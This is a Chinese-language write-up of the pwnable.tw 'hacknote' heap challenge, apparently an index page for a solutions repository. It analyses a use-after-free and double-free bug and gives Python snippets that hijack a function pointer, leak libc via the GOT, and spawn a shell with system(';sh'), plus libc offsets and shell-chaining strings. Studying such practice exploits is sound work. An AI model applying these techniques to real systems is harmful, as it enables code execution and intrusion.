---
tags:
  - use-after-free
  - got-overwrite
  - ret2libc
platform: pwnable.tw
points: 150
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "笔记管理中的 use-after-free 允许把用户数据重新分配到笔记元数据堆块，从而覆盖打印函数指针并调用 system。"
proof-of-concept: no
---

# hacknote — pwnable.tw（150 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10102`
>
> Flag: `FLAG{...}`（动态）

## 题目概览

一个经典的堆笔记管理二进制（i386，No PIE，Partial RELRO，NX，栈 Canary），链接 glibc 2.23（32 位）。程序提供四种操作：新增笔记、删除笔记、打印笔记、退出。每条笔记由两部分组成：一个**元数据结构体**（含函数指针）和一个独立的**内容缓冲区**，二者都在堆上分配。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed addresses
```

## 程序结构

程序维护一个全局的笔记指针数组 `notelist[5]` 和一个 `count` 变量。每条笔记对应两次堆分配：

### 笔记元数据结构体（8 字节，`malloc(8)`）

| 偏移 | 字段 | 类型 |
|--------|-------|------|
| `0x00` | `print_func` | `void (*)(note *)` —— 打印笔记时调用的函数指针 |
| `0x04` | `content` | `char *` —— 指向内容缓冲区 |

### 各操作（伪代码）

```c
// Add Note (option 1)
void add_note() {
    if (count > 5) return;
    note *p = malloc(8);              // metadata struct
    p->print_func = 0x0804862B;       // default: prints content via puts()
    printf("Note size :"); scanf("%d", &size);
    p->content = malloc(size);        // content buffer
    printf("Content :"); read(0, p->content, size);
    notelist[count++] = p;
}

// Delete Note (option 2)  — VULNERABLE
void delete_note() {
    printf("Index :"); scanf("%d", &idx);
    if (idx < 0 || idx >= count) { puts("Out of bound!"); return; }
    if (notelist[idx]) {
        free(notelist[idx]->content);  // free content
        free(notelist[idx]);           // free metadata
        // BUG: notelist[idx] is NOT set to NULL
    }
}

// Print Note (option 3)  — triggers function pointer call
void print_note() {
    printf("Index :"); scanf("%d", &idx);
    if (idx < 0 || idx >= count) { puts("Out of bound!"); return; }
    if (notelist[idx])
        notelist[idx]->print_func(notelist[idx]);  // calls func ptr with struct as arg
}
```

## 漏洞

### V1 — Use-After-Free（主漏洞，可利用）

**根因：** `delete_note()` 对内容缓冲区和元数据结构体都调用了 `free()`，但**没有把 `notelist[idx]` 置为 NULL**。悬垂指针一直留在全局数组里。

```c
free(notelist[idx]->content);
free(notelist[idx]);
// notelist[idx] = NULL;   ← MISSING
```

**影响：** 删除后，对被删索引调用 `print_note(idx)` 仍会解引用 `notelist[idx]`，读取偏移 `+0x00` 处的函数指针并以结构体地址为参数调用它。如果该已释放堆块被重新分配且内容被覆盖，攻击者就能控制函数指针及其参数。

### V2 — Double Free（V1 的变体）

由于 `notelist[idx]` 从不置空，可以对同一索引**多次**调用 `delete_note(idx)`，造成双释放。这会破坏 fastbin 空闲链表，可用于 fastbin dup 攻击。若干解法利用的就是这个变体而非基础 UAF。

### V3 — 未强制分配上限

`count` 只增不减（删除时不递减）。配合上限 5，这限制了总分配次数，但无法阻止对已释放笔记的 UAF/双释放。

## 关键地址（固定，No PIE）

```python
NOTE_PRINT_FUNC = 0x0804862B   # default print function (calls puts on content)
PUTS_GOT        = 0x0804A024   # puts@GOT
READ_GOT        = 0x0804A00C   # read@GOT
PRINTF_GOT      = 0x0804A010   # printf@GOT
FREE_GOT        = 0x0804A034   # free@GOT
```

## 利用路径

所有解法都利用 V1（UAF）或 V2（双释放）。核心技术相同：用攻击者控制的数据重新占用已释放笔记的元数据堆块，从而劫持函数指针。差别在于堆的布置方式和泄漏的 libc 函数。

---

### 路径 A — Fastbin UAF：经 `print_func` 泄漏 GOT + `system(";sh")`

**相关题解：** 约占全部解法的 90%（100、138、1155、1251、1269、1297、1303、1387、10453、11699、12705、13060、exp.py 等）

这是最标准、也最简单的堆利用模式。

**步骤：**

1. **分配两条笔记**，内容较小（8–32 字节）。两个元数据结构体（8 字节）和内容缓冲区都会落到同一 fastbin 尺寸类。

```python
add(16, "A"*16)   # note[0]: metadata=malloc(8), content=malloc(16)
add(16, "B"*16)   # note[1]: metadata=malloc(8), content=malloc(16)
```

2. **释放两条笔记。** 0x10 bin（8 字节可用）的 fastbin 空闲链表现在大致是：
```text
fastbin[0x10]: note1_meta → note0_meta → note1_content → note0_content
```
（确切顺序取决于内容大小；若内容为 16 字节，内容会进另一个 bin。）

3. **分配一条内容大小为 8 的新笔记。** 元数据的 `malloc(8)` 从 fastbin 取走 `note1_meta`，内容的 `malloc(8)` 取走 `note0_meta`。于是写内容就等于覆盖 `note[0]`（已释放）的元数据：

```python
add(8, p32(0x0804862B) + p32(PUTS_GOT))
#       ^print_func        ^"content" = puts@GOT
```

4. **打印 note[0]**（这个已释放/悬垂的指针）。这会调用 `0x0804862B(note0_meta)`，即执行 `puts(*(note0_meta+4))` = `puts(puts@GOT)`，从而泄漏 `puts` 的运行时地址。

```python
show(0)
puts_addr = u32(recv(4))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
```

5. **释放这条新笔记，再用 `system` + `";sh"` 重新分配：**

```python
delete(2)
add(8, p32(system) + b";sh\x00")
```

6. **再次打印 note[0]。** 这会调用 `system(note0_meta)`，即执行 `system("\xXX\xXX\xXX\xXX;sh\x00")`。前 4 字节（即 `system` 自身地址）会产生一条 command-not-found 错误，但**`;sh`** 会借助命令串联启动一个 shell。

**`;sh` 为什么可行：** `system()` 会调用 `/bin/sh -c <arg>`。参数是从偏移 0 开始的整个 8 字节结构体：`p32(system) + ";sh\x00"`。shell 看到以 `;` 分隔的两条命令——第一条（二进制乱码）静默失败，第二条（`sh`）拉起交互式 shell。各解法中见过的替代写法有：`"||sh"`、`"&&sh"`、`"; cat /home/hacknote/flag;"`、`";/bin/sh\x00"`。

**可靠性：** 100%——确定性，无需暴力。

---

### 路径 B — Unsorted Bin 泄漏 + Fastbin UAF

**相关题解：** 1220、10115、10453、12245、14032

当笔记内容 ≥ 0x80（超出 fastbin 范围）时，`free()` 会把堆块放进 **unsorted bin**，其中存放着指向 `main_arena`（libc）的 `fd`/`bk` 指针。这提供了另一种 libc 泄漏方式。

**步骤：**

1. **分配一个大笔记**（内容 ≥ 0x80，例如 0x80 或 0x400），再分配一个保护笔记，防止与 top 堆块合并。
2. **释放大笔记。** 内容堆块进入 unsorted bin，其 `fd`/`bk` 现指向 `main_arena+X`。
3. **重新分配**同样大小。内容缓冲区从 unsorted bin 取出。读回用户数据之后 4 字节处的 `fd` 指针。
4. **由 `main_arena` 偏移算出 libc 基址。**
5. **接着做 fastbin UAF**（路径 A 步骤 1-6）取得代码执行。

```python
add(0x80, "A")           # note[0] — large content
add(0x20, "B")           # note[1] — guard (prevents consolidation with top)
delete(0)                 # content goes to unsorted bin
add(0x80, "XXXX")        # reallocate; read back unsorted bin fd
show(0)                   # leak: 4 bytes of data + 4 bytes of fd pointer
libc_base = u32(recv(4)[4:8]) - main_arena_offset
```

---

### 路径 C — 大分配重叠

**相关题解：** 1006、1126、1236、10128

部分解法不去凑 fastbin 尺寸，而是用一次大分配去覆盖多个已释放的小笔记结构体。

**步骤：**

1. **分配两条笔记**，内容中等（128–1000 字节）。
2. **释放两条笔记。**
3. **分配一条内容很大的新笔记**（例如 1000+ 字节）。内容缓冲区会跨越旧元数据结构体所在的内存；在正确偏移处放置填充 + 受控数据即可覆盖旧的函数指针字段。

```python
add(500, "A"*500)   # note[0]
add(500, "B"*500)   # note[1]
delete(1)
delete(0)
# note[0] metadata was at heap+X; with large alloc, content buffer covers it
add(1000, "P"*504 + p32(0x0804862B) + p32(PUTS_GOT))
show(1)              # triggers UAF on freed note[1]
```

到函数指针的偏移取决于堆块大小与堆布局（常见为 504 或 1008 字节填充，可用循环模式定位）。不如路径 A 优雅，但仍可靠。

---

### 路径 D — 双释放 Fastbin Dup

**相关题解：** 1303、1316、1384、11540

显式对同一索引触发双释放，以破坏 fastbin 空闲链表。

```python
add(8, "sh\x00\x00")   # note[0]
add(8, "sh\x00\x00")   # note[1]
delete(0)
delete(1)
delete(0)               # double free! fastbin: note0 → note1 → note0 → ...
```

这在 fastbin 里形成环。后续分配会反复返回同样的堆块，从而做受控覆盖。其余流程同路径 A。

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| Use-After-Free | V1：`notelist[]` 中的悬垂指针 | 确定性 |
| Double Free | V2：释放后不置 NULL | 确定性 |
| 函数指针劫持 | UAF：覆盖复用堆块中的 `print_func` | 确定性 |
| libc 泄漏（读 GOT） | 经被劫持的 `print_func` 调 `puts(GOT_entry)` | 确定性 |
| libc 泄漏（unsorted bin） | 从已释放大堆块读 `main_arena` 指针 | 确定性 |
| 代码执行 | 经被劫持的 `print_func` 执行 `system(";sh")` | 确定性 |

## 偏移（pwnable.tw `libc_32.so.6`，glibc 2.23，32 位）

```python
puts        = 0x05f140
system      = 0x03a940
read        = 0x0d41c0
printf      = 0x049010
free        = 0x070750
main_arena  = 0x1b07b0
bin_sh      = 0x158e8b
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `exp.py` | A | Fastbin UAF → GOT 泄漏 → `system(";sh")` | 干净的最小利用 |
| `100.md` | A | Fastbin UAF，经 `__libc_start_main` GOT 泄漏 | Python 2 |
| `138.md` | A | Fastbin UAF → `system(";/bin/sh;")` | Ruby 实现 |
| `1006.md` | C | 大分配重叠（1000 字节），泄漏 stdout | 偏移 504/1008 填充 |
| `1126.md` | C | 大分配重叠，格式串 `%19$p` 泄栈 | 少见：用 `printf` 作 print_func 泄栈 |
| `1155.md` | A | Fastbin UAF，内容大小 20 | 极简 |
| `1220.md` | B | 经 `main_arena` 的 unsorted bin 泄漏，大分配重叠 | 两阶段：unsorted 泄漏 + fastbin 劫持 |
| `1236.md` | C | 大分配（1000），堆基址泄漏 + libc 泄漏 | 多步骤 + 堆喷射 |
| `1251.md` | A | Fastbin UAF，函数命名为 `FUCK` | 简洁、注释好 |
| `1269.md` | A | Fastbin UAF，经 `read@GOT` 泄漏 | 标准做法 |
| `1297.md` | A | Fastbin UAF，附 checksec 输出 | 展示了二进制保护 |
| `1303.md` | D | 双释放 → fastbin dup | 显式对同一索引释放两次 |
| `1316.md` | D | 双释放，额外分配去重 | 双释放后再分配 3 次 |
| `1351.md` | A | Fastbin UAF，经全局 `count` 泄堆 | 同时泄漏堆地址 |
| `1384.md` | D | 双释放 fastbin 成环 | 显式 `a→b→a` 环 |
| `10115.md` | B | Unsorted bin 泄漏 + 双释放 | 两种技术结合 |
| `10128.md` | C | 大分配重叠，逐步讲解 | 叙述最好的题解 |
| `10453.md` | B + A | 先 unsorted bin 泄漏，再 fastbin | 日文，简洁 |
| `11540.md` | D | 双释放，裸 `send` + `%04d` 格式化 | 少见的 I/O 风格 |
| `12245.md` | B | Unsorted bin 泄漏 `main_arena+0x30` | 中文，UAF 讲解到位 |
| `12705.md` | A | 标准做法，用 32 字节笔记 | 干净的 Python 2 |
| `13060.md` | A | 标准做法，用 `puts@GOT` | 现代 Python 3 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用利用脚本（原生 Python，不用 pwntools） |
| `desc.txt` | 题目描述 |
| `artifacts/hacknote` | 原始题目二进制（i386，已 strip） |
| `artifacts/libc_32.so.6` | 远端 libc（glibc 2.23，32 位） |
| `solution/*.md` | 社区题解文章（218 个解法） |
